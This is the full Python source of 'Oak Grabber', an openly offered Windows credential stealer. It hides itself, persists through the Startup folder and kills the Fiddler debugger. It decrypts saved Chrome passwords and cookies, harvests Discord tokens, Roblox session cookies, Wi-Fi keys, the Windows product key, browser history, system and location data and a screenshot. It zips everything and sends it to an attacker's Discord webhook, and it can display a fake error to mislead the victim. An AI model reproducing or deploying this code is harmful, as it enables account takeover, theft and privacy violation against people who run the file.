import ctypes, time
starttime = time.time()

#config
webhook = "webhook_here"#change webhook_here to ur webhook
ping_on_run = True #get pinged when someone runs ur file (True/False)
add_to_startup = True #adds exe file to startup (True/False)
HideConsole = True #runs in the background (True/False)
Selfhide = True #hides the file (True/False)
fake_error_message = False #displays a fake error message when file ran. (True/False)
error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.' #custom message here




if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
else:pass
import os, re, json, psutil, random, platform, requests, base64, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, glob, shutil, sys
from win32crypt import CryptUnprotectData
from shutil import copy2
from tkinter import messagebox
from datetime import datetime
from base64 import b64decode
from zipfile import ZipFile
from threading import Thread
from Crypto.Cipher import AES
from PIL import ImageGrab

filename =  os.path.basename(sys.argv[0])
appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
wiseoaktree = os.path.join(roaming, "OakGrabber")
try:
 os.mkdir(wiseoaktree)
except:
 pass
def get_master_key():
        with open(appdata + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
masterkey = get_master_key()
def decrypt_val(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"
def decrypt_password(buff, master_key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception as f:
            print(f)
            return "Chrome < 80"
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore') if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'):
                for token in re.findall(regex, line):
                    tokens.append(token)

    return tokens
def killfiddler():
    for proc in psutil.process_iter():
        if proc.name() == "Fiddler.exe":
            proc.kill()
threading.Thread(target=killfiddler).start()
def main():
    if add_to_startup is True:
     try:
        fr =  os.path.basename(sys.argv[0])
        startup =  ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(fr, startup)
     except:
         pass
    if Selfhide is True:
            ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
    os.chdir(roaming+ "/OakGrabber")
    if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
    ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
    gr = requests.get("https://ipinfo.io/json")
    if gr.status_code == 200:
            data = gr.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
    ip_addr = requests.get('https://api.ipify.org').content.decode('utf8')
    Oakname = socket.gethostname()
    pc_username = os.getenv("UserName")
    checked = []
    chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
    default_paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': appdata + '\\Amigo\\User Data',
            'Torch': appdata + '\\Torch\\User Data',
            'Kometa': appdata + '\\Kometa\\User Data',
            'Orbitum': appdata + '\\Orbitum\\User Data',
            'CentBrowser': appdata + '\\CentBrowser\\User Data',
            '7Star': appdata + '\\7Star\\7Star\\User Data',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'Chrome': chrome_user_data + '\\Default',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data',
            'Google Chrome': appdata + '\\Google\\Chrome\\User Data\\Default',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': appdata + '\\Iridium\\User Data\\Default'
    }
    google_paths = [
            appdata + '\\Google\\Chrome\\User Data\\Default',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5',
        ]
    if ping_on_run is True:
     message = '@everyone **someone ran ur Oak Grabber**'
    else:
     message = '**someone ran ur Oak Grabber**'
    embedMsg = "**someone ran ur Oak Grabber**\n\n**Tokens:** "
    for platforrm, path in default_paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        embedMsg = f"**someone ran ur Oak Grabber**\n\n"
        if len(tokens) > 0:
            for token in tokens:
                if token in checked:
                    continue
                checked.append(token)
                embedMsg += f"**Token:** ```{token}```"
        else:
            embedMsg = '```No tokens found.```'


    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    try:disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
    except:disk = "N/A"
    try:about = f"DISK: {disk}GB"
    except:about = "N/A"
    now = datetime.now()
    try:ti= (now.strftime('Date: '+'%Y/%m/%d'+'\nTime: ''%I:%M:%S'))
    except:ti = "N/A"
    try:ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
    except:ram3 = "N/A"
    try:ramg = (str(ram3).replace(' ', ' '))
    except:ramg = "N/A"
    try:idk = os.getcwd()
    except:idk = "N/A"
    try:ee = struct.calcsize("P")*8
    except:ee = "N/A"
    try:windowskey = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", shell=True).decode().rstrip()
    except:windowskey = "N/A"
    try:platform = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", shell=True).decode().rstrip()
    except:platform = "N/A"
    try:hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    except:hardwareid = "N/A"
    try: cpu = subprocess.check_output('wmic cpu get name').decode().split('\n')[1].strip()
    except: cpu = 'N/A'
    try: gpu = subprocess.check_output('wmic path win32_VideoController get name').decode().split('\n')[1].strip()
    except: gpu = 'N/A'
    try: size = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
    except: size = 'N/A'
    try: rr = subprocess.check_output('wmic path win32_VideoController get currentrefreshrate').decode().split('\n')[1].strip()
    except: rr = 'N/A'
    try: bm = subprocess.check_output('wmic bios get manufacturer').decode().split('\n')[1].strip()
    except: bm = 'N/A'
    try: mn = subprocess.check_output('wmic csproduct get name').decode().split('\n')[1].strip()
    except: mn = 'N/A'
    try: ps = subprocess.check_output('tasklist').decode()
    except: ps = 'N/A'
    try: mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except: mac = 'N/A'
    def cookies():
        with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
            f.write("Google Chrome Cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")

        for path in google_paths:
            path += '\\Network\\Cookies'
            if os.path.exists(path):
                copy2(path, "Cookievault.db")
                conn = sqlite3.connect("Cookievault.db")
                cursor = conn.cursor()
                with open(".\\google-cookies.txt", "a", encoding="utf-8") as f:
                    for result in cursor.execute("SELECT host_key, name, encrypted_value from cookies"):
                        host, name, value = result
                        value = decrypt_password(value,masterkey)
                        if host and name and value != "":
                            f.write("""===============================\nSite: {:<30} \nName: {:<30} \nValue: {:<30}\n""".format(host, name, value))

                cursor.close()
                conn.close()
                os.remove("Cookievault.db")
    def passwords():
        google_pass = ".\\google-passwords.txt"
        with open(google_pass, "w", encoding="utf-8") as f:
            f.write(f"Google Chrome Passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
        for path in google_paths:
            path += '\\Login Data'
            if os.path.exists(path):
                copy2(path, "Loginvault.db")
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                with open(google_pass, "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT action_url, username_value, password_value FROM logins"):
                        url, username, password = result
                        password = decrypt_password(password, masterkey)
                        if url and username and password != "":
                            f.write("===============================\nUsername: {:<30} \nPassword: {:<30} \nSite: {:<30}\n".format(username, password, url))
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
    def history():
        google_history = ".\\google-history.txt"
        with open(google_history, "w", encoding="utf-8") as f:
            f.write(f"Google Chrome history | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
        for path in google_paths:
            path += '\\History'
            if os.path.exists(path):
                copy2(path, "Historyvault.db")
                conn = sqlite3.connect("Historyvault.db")
                cursor = conn.cursor()
                sites = []
                with open(google_history, "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT url, title, visit_count, last_visit_time FROM urls"):
                        url, title, visit_count, last_visit_time = result
                        if url and title and visit_count and last_visit_time != "":
                            sites.append(
                                (url, title, visit_count, last_visit_time))
                        sites.sort(key=lambda x: x[3], reverse=True)
                    for site in sites:
                        f.write(f"Site: {site[1]}\n")

                cursor.close()
                conn.close()
                os.remove("Historyvault.db")
    def sysinfo():
        tree = fr'''System Info  | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber
HWID: {hardwareid}
RAM: {ramg} GB
Architecture: {ee} bit
Username: {pc_username}
{about}
Platform: {platform}
PC-Name: {Oakname}
Windows key: {windowskey}
{ti}
CPU: {cpu}
GPU: {gpu}
Refresh rate: {rr}
Model name: {mn}
Build manufacturer: {bm}
Resolution: {size}
Path: {idk}
IP INFO
IP: {ip}
City: {city}
Country: {country}
Region: {region}
GoogleMaps: {googlemap}
Service provider: {org}
MAC: {mac}
Coordinates: {loc}
Processes running
{ps}'''
        with open("sysinfo.txt", 'w') as fp:
           fp.write(str(tree))
    def robloxcookies():
         try:
           cookie = str(browser_cookie3.chrome(domain_name='roblox.com'))
           c = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           c = ""
         try:
           cookie = str(browser_cookie3.firefox(domain_name='roblox.com'))
           c2 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           c2 = ""
         try:
           cookie = str(browser_cookie3.opera(domain_name='roblox.com'))
           c3 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           c3 = ""
         try:
           cookie = str(browser_cookie3.edge(domain_name='roblox.com'))
           c4 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           c4 = ""
         try:
           cookie = str(browser_cookie3.chromium(domain_name='roblox.com'))
           c5 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
           c5 = ""
         try:
          cookie = str(browser_cookie3.brave(domain_name='roblox.com'))
          c6 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
         except:
          c6 = ""
         with open("robloxcookies.txt", "w") as fs:
          fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}\n{c2}\n{c3}\n{c4}\n{c5}\n{c6}")
    def wifistealer():
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        w = ("wifi passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\nWi-Fi Name                    | Password")
        o = ("------------------------------------------")
        for i in profiles:
          results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
          results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
           t = ("{:<30}| {:<}".format(i,results[0]))
        except IndexError:
           t = ("{:<30}| {:<}]".format(i,""))
        with open("wifistealer.txt",'w') as ws:
           ws.write(f"{w}\n{o}\n{t}")
    def screenshot():
        ss = ImageGrab.grab()
        ss.save(f'screenshot.png')
    def zip():
         with ZipFile(f'Oak-Logs-{pc_username}.zip', 'w') as wise:
            wise.write("screenshot.png")
            wise.write("sysinfo.txt")
            wise.write("google-passwords.txt")
            wise.write("google-cookies.txt")
            wise.write("google-history.txt")
            wise.write("robloxcookies.txt")
            wise.write("wifistealer.txt")
    def upload():
     fc = 0
     f = ""
     f2 = ""
     for x in os.listdir():
      if x.endswith(".txt") or x.endswith(".png"):
                 f += f"│ {x}\n"
                 fc += 1
      if x.endswith(".zip"):
          f2 += f"└ {x}"
     embed = {
                 "username": f"{pc_username} | Oak Grabber",
                 "content": message,
                 "avatar_url":"https://i.imgur.com/bbWgtHI.png",
                 "title": "__Oak Grabber__",
                 "embeds": [
                     {
                         "author": {
                             "name": "Wise Oak Tree for life 😎",
                             "url": "https://github.com/j0taro/Oak-token-Grabber",
                             "icon_url": "https://i.imgur.com/bbWgtHI.png"
                         },
                         "description": f"""{embedMsg}\n**__PC INFO__**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
                         "color": 0x1e8a81,
                         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                         "thumbnail": {
                           "url": "https://i.imgur.com/dEiUxyB.png"
                         },
                          "footer": {
                             "text": "Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber",
                             "icon_url": "https://i.imgur.com/dEiUxyB.png"
                         }
                     }
                 ]
             }
     file = {
        "username": f"{pc_username} | Oak Grabber",
        "avatar_url":"https://i.imgur.com/bbWgtHI.png"}
     payload = json.dumps({ 'content': message, 'embeds': [embed] })
     with open(f'Oak-Logs-{pc_username}.zip', 'rb') as f:
        requests.post(webhook, json = embed)
        requests.post(webhook,data=file ,files={'upload_file': f})
    def cleanup():
        os.chdir(roaming)
        shutil.rmtree("OakGrabber")
    def error():
     if fake_error_message is True:
      messagebox.showerror('Error', error_message)
    wifistealer()
    cookies()
    history() #code kinda missed up here fr lmao
    passwords()
    sysinfo()
    robloxcookies()
    screenshot()
    zip()
    upload()
    cleanup()
    error()
if __name__ == '__main__':
    main()
